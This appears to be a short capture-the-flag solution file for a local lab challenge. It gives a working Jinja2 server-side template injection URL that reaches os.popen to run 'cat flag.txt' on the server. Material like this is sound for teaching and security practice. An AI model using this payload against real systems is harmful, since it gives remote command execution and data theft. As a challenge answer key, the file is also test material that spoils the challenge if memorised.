# Solution


Do Server-side template Injection and read flag

```bash
# Example solution, when deployed on localhost. Change to different address if needed
http://localhost:5000/greeting?name={{request.application.__globals__.__builtins__.__import__(%27os%27).popen(%27cat%20flag.txt%27).read()}}

```
